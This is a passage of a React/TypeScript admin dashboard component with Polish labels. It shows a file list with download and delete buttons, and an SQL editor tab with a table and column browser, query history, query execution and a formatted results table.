                                                            onClick={() => handleDownloadFile(file)}
                                                            className="flex-1 px-3 py-1.5 bg-emerald-600/20 hover:bg-emerald-600/40 border border-emerald-500/30 rounded-lg text-xs text-emerald-300 transition-colors"
                                                        >
                                                            ⬇️ Pobierz
                                                        </button>
                                                    </>
                                                )}
                                                <button
                                                    onClick={() => handleDeleteFile(file)}
                                                    className="px-3 py-1.5 bg-red-600/20 hover:bg-red-600/40 border border-red-500/30 rounded-lg text-xs text-red-300 transition-colors"
                                                >
                                                    🗑️
                                                </button>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            )}
                        </div>
                    </div>
                )}

                {/* Zakładka Edytor SQL */}
                {activeTab === 'sql' && (
                    <div className="space-y-6">
                        {/* Layout dwukolumnowy */}
                        <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
                            {/* Panel boczny - Lista tabel */}
                            <div className="lg:col-span-1 space-y-4">
                                <div className="bg-slate-900/50 border border-slate-800 rounded-xl overflow-hidden">
                                    <div className="p-4 bg-slate-800/50 border-b border-slate-700">
                                        <h3 className="font-semibold text-white flex items-center gap-2">
                                            📊 Struktura bazy
                                        </h3>
                                        <p className="text-xs text-slate-400 mt-1">Kliknij tabelę, by wygenerować zapytanie</p>
                                    </div>
                                    
                                    {tablesLoading ? (
                                        <div className="p-4 text-center text-slate-500 animate-pulse">
                                            Ładowanie...
                                        </div>
                                    ) : (
                                        <div className="max-h-[500px] overflow-y-auto">
                                            {tables.map((table) => (
                                                <div key={table.name} className="border-b border-slate-800 last:border-b-0">
                                                    <button
                                                        onClick={() => {
                                                            insertTableQuery(table.name);
                                                            setSelectedTable(selectedTable === table.name ? null : table.name);
                                                        }}
                                                        className={`w-full p-3 text-left hover:bg-slate-800/50 transition-colors flex items-center justify-between ${
                                                            selectedTable === table.name ? 'bg-violet-600/20 border-l-2 border-violet-500' : ''
                                                        }`}
                                                    >
                                                        <div className="flex items-center gap-2">
                                                            <span className="text-lg">
                                                                {table.type === 'table' ? '📋' : '👁️'}
                                                            </span>
                                                            <span className="font-mono text-sm text-white">{table.name}</span>
                                                        </div>
                                                        <span className="text-xs text-slate-500 bg-slate-800 px-2 py-0.5 rounded">
                                                            {table.rowCount}
                                                        </span>
                                                    </button>
                                                    
                                                    {/* Rozwinięte kolumny */}
                                                    {selectedTable === table.name && (
                                                        <div className="bg-slate-950/50 p-3 border-t border-slate-800">
                                                            <div className="text-xs text-slate-400 mb-2">Kolumny:</div>
                                                            <div className="space-y-1">
                                                                {table.columns.map((col) => (
                                                                    <div 
                                                                        key={col.cid} 
                                                                        className="flex items-center justify-between text-xs py-1 px-2 rounded bg-slate-900/50 hover:bg-slate-800/50 cursor-pointer"
                                                                        onClick={() => {
                                                                            setSqlQuery(prev => {
                                                                                if (prev.includes('*')) {
                                                                                    return prev.replace('*', col.name);
                                                                                }
                                                                                return prev;
                                                                            });
                                                                        }}
                                                                    >
                                                                        <div className="flex items-center gap-2">
                                                                            {col.pk ? (
                                                                                <span className="text-amber-400" title="Klucz główny">🔑</span>
                                                                            ) : (
                                                                                <span className="text-slate-600">•</span>
                                                                            )}
                                                                            <span className="font-mono text-slate-300">{col.name}</span>
                                                                        </div>
                                                                        <span className="text-slate-500 uppercase">{col.type || 'any'}</span>
                                                                    </div>
                                                                ))}
                                                            </div>
                                                        </div>
                                                    )}
                                                </div>
                                            ))}
                                        </div>
                                    )}
                                </div>

                                {/* Historia zapytań */}
                                {queryHistory.length > 0 && (
                                    <div className="bg-slate-900/50 border border-slate-800 rounded-xl overflow-hidden">
                                        <div className="p-4 bg-slate-800/50 border-b border-slate-700 flex items-center justify-between">
                                            <h3 className="font-semibold text-white flex items-center gap-2">
                                                📜 Historia
                                            </h3>
                                            <button
                                                onClick={() => setQueryHistory([])}
                                                className="text-xs text-slate-500 hover:text-slate-300"
                                            >
                                                Wyczyść
                                            </button>
                                        </div>
                                        <div className="max-h-[200px] overflow-y-auto">
                                            {queryHistory.map((item) => (
                                                <button
                                                    key={item.id}
                                                    onClick={() => setSqlQuery(item.query)}
                                                    className="w-full p-3 text-left hover:bg-slate-800/50 transition-colors border-b border-slate-800 last:border-b-0"
                                                >
                                                    <div className="flex items-center gap-2 mb-1">
                                                        <span className={item.success ? 'text-emerald-400' : 'text-red-400'}>
                                                            {item.success ? '✓' : '✕'}
                                                        </span>
                                                        <span className="text-xs text-slate-500">
                                                            {item.timestamp.toLocaleTimeString('pl-PL')}
                                                        </span>
                                                        {item.executionTime && (
                                                            <span className="text-xs text-slate-600">
                                                                {item.executionTime}ms
                                                            </span>
                                                        )}
                                                    </div>
                                                    <code className="text-xs text-slate-400 font-mono line-clamp-2">
                                                        {item.query}
                                                    </code>
                                                </button>
                                            ))}
                                        </div>
                                    </div>
                                )}
                            </div>

                            {/* Panel główny - Edytor i wyniki */}
                            <div className="lg:col-span-3 space-y-4">
                                {/* Edytor SQL */}
                                <div className="bg-slate-900/50 border border-slate-800 rounded-xl overflow-hidden">
                                    <div className="p-4 bg-slate-800/50 border-b border-slate-700 flex items-center justify-between">
                                        <h3 className="font-semibold text-white flex items-center gap-2">
                                            ⌨️ Zapytanie SQL
                                        </h3>
                                        <div className="flex items-center gap-2">
                                            <button
                                                onClick={() => setSqlQuery('')}
                                                className="px-3 py-1.5 text-xs bg-slate-700 hover:bg-slate-600 rounded-lg text-slate-300 transition-colors"
                                            >
                                                🗑️ Wyczyść
                                            </button>
                                            <button
                                                onClick={() => executeSqlQuery()}
                                                disabled={sqlLoading}
                                                className="px-4 py-1.5 text-sm bg-gradient-to-r from-violet-600 to-purple-600 hover:from-violet-500 hover:to-purple-500 disabled:opacity-50 disabled:cursor-not-allowed rounded-lg text-white font-medium transition-all flex items-center gap-2 shadow-lg shadow-violet-900/30"
                                            >
                                                {sqlLoading ? (
                                                    <>
                                                        <span className="animate-spin">⏳</span>
                                                        Wykonuję...
                                                    </>
                                                ) : (
                                                    <>
                                                        ▶️ Wykonaj
                                                    </>
                                                )}
                                            </button>
                                        </div>
                                    </div>
                                    <div className="p-4">
                                        <textarea
                                            value={sqlQuery}
                                            onChange={(e) => setSqlQuery(e.target.value)}
                                            onKeyDown={(e) => {
                                                // Ctrl/Cmd + Enter wykonuje zapytanie
                                                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                                                    e.preventDefault();
                                                    executeSqlQuery();
                                                }
                                            }}
                                            placeholder="SELECT * FROM events LIMIT 10;"
                                            className="w-full h-40 bg-slate-950 border border-slate-700 rounded-xl p-4 font-mono text-sm text-slate-200 placeholder:text-slate-600 focus:border-violet-500 focus:ring-1 focus:ring-violet-500 outline-none resize-y"
                                            spellCheck={false}
                                        />
                                        <div className="mt-2 flex items-center justify-between text-xs text-slate-500">
                                            <span>💡 Ctrl + Enter = Wykonaj zapytanie</span>
                                            <span>⚠️ Zapytania modyfikujące (INSERT, UPDATE, DELETE) są dozwolone</span>
                                        </div>
                                    </div>
                                </div>

                                {/* Wyniki */}
                                <div className="bg-slate-900/50 border border-slate-800 rounded-xl overflow-hidden">
                                    <div className="p-4 bg-slate-800/50 border-b border-slate-700 flex items-center justify-between">
                                        <h3 className="font-semibold text-white flex items-center gap-2">
                                            📊 Wyniki
                                            {sqlResult?.success && sqlResult.rowCount !== undefined && (
                                                <span className="text-xs font-normal text-slate-400 bg-slate-700 px-2 py-0.5 rounded">
                                                    {sqlResult.rowCount} {sqlResult.queryType === 'SELECT' ? 'wierszy' : 'zmienionych'}
                                                </span>
                                            )}
                                            {sqlResult?.executionTime !== undefined && (
                                                <span className="text-xs font-normal text-emerald-400">
                                                    {sqlResult.executionTime}ms
                                                </span>
                                            )}
                                        </h3>
                                        {sqlResult?.data && sqlResult.data.length > 0 && (
                                            <button
                                                onClick={() => {
                                                    const json = JSON.stringify(sqlResult.data, null, 2);
                                                    copyToClipboard(json);
                                                }}
                                                className="px-3 py-1.5 text-xs bg-slate-700 hover:bg-slate-600 rounded-lg text-slate-300 transition-colors"
                                            >
                                                📋 Kopiuj JSON
                                            </button>
                                        )}
                                    </div>

                                    {sqlLoading ? (
                                        <div className="p-20 text-center text-slate-500 animate-pulse">
                                            <div className="text-4xl mb-4">⏳</div>
                                            Wykonuję zapytanie...
                                        </div>
                                    ) : sqlResult ? (
                                        sqlResult.success ? (
                                            sqlResult.data && sqlResult.data.length > 0 ? (
                                                <div className="overflow-x-auto">
                                                    <table className="w-full text-left">
                                                        <thead>
                                                            <tr className="bg-slate-800 text-slate-400 text-xs uppercase tracking-wider">
                                                                {sqlResult.columns?.map((col, i) => (
                                                                    <th key={i} className="p-3 border-b border-slate-700 font-mono">
                                                                        {col}
                                                                    </th>
                                                                ))}
                                                            </tr>
                                                        </thead>
                                                        <tbody className="divide-y divide-slate-800">
                                                            {sqlResult.data.map((row, rowIndex) => (
                                                                <tr key={rowIndex} className="hover:bg-slate-800/50 transition-colors">
                                                                    {sqlResult.columns?.map((col, colIndex) => {
                                                                        const value = row[col];
                                                                        let displayValue: string;
                                                                        let valueClass = 'text-slate-300';

                                                                        if (value === null) {
                                                                            displayValue = 'NULL';
                                                                            valueClass = 'text-slate-600 italic';
                                                                        } else if (typeof value === 'boolean') {
                                                                            displayValue = value ? 'true' : 'false';
                                                                            valueClass = value ? 'text-emerald-400' : 'text-red-400';
                                                                        } else if (typeof value === 'number') {
                                                                            displayValue = value.toString();
                                                                            valueClass = 'text-amber-400';
                                                                        } else if (typeof value === 'object') {
                                                                            displayValue = JSON.stringify(value);
                                                                            valueClass = 'text-violet-400';
                                                                        } else {
                                                                            displayValue = String(value);
                                                                            // Skróć bardzo długie wartości
                                                                            if (displayValue.length > 100) {
                                                                                displayValue = displayValue.substring(0, 100) + '...';
                                                                            }
                                                                        }

                                                                        return (
                                                                            <td 
                                                                                key={colIndex} 
                                                                                className={`p-3 text-sm font-mono ${valueClass} max-w-[300px] truncate`}
                                                                                title={String(value)}
                                                                            >
                                                                                {displayValue}
                                                                            </td>
                                                                        );
                                                                    })}
                                                                </tr>
                                                            ))}
                                                        </tbody>
                                                    </table>
                                                </div>
                                            ) : sqlResult.queryType !== 'SELECT' ? (
                                                <div className="p-10 text-center">
                                                    <div className="text-5xl mb-4">✅</div>
                                                    <p className="text-emerald-400 font-medium text-lg">Zapytanie wykonane pomyślnie</p>
                                                    <p className="text-slate-400 text-sm mt-2">
                                                        {sqlResult.changes} {sqlResult.changes === 1 ? 'wiersz zmieniony' : 'wierszy zmienionych'}
                                                    </p>
                                                </div>
                                            ) : (
                                                <div className="p-10 text-center text-slate-500">
                                                    <div className="text-5xl mb-4">📭</div>
                                                    <p>Zapytanie nie zwróciło żadnych wyników</p>
                                                </div>
                                            )
                                        ) : (
                                            <div className="p-6">
                                                <div className="bg-red-900/30 border border-red-700/50 rounded-xl p-4">
                                                    <div className="flex items-start gap-3">
                                                        <span className="text-2xl">❌</span>
                                                        <div>
                                                            <h4 className="font-medium text-red-300">Błąd wykonania zapytania</h4>
                                                            <pre className="mt-2 text-sm text-red-400 font-mono whitespace-pre-wrap">
                                                                {sqlResult.error}
                                                            </pre>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        )
                                    ) : (
                                        <div className="p-20 text-center text-slate-500">
                                            <div className="text-5xl mb-4">💡</div>
                                            <p className="text-lg">Wprowadź zapytanie SQL i kliknij „Wykonaj"</p>
                                            <p className="text-sm mt-2">lub wybierz tabelę z panelu bocznego</p>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>
                    </div>
                )}
        </DashboardContent>
    );
}

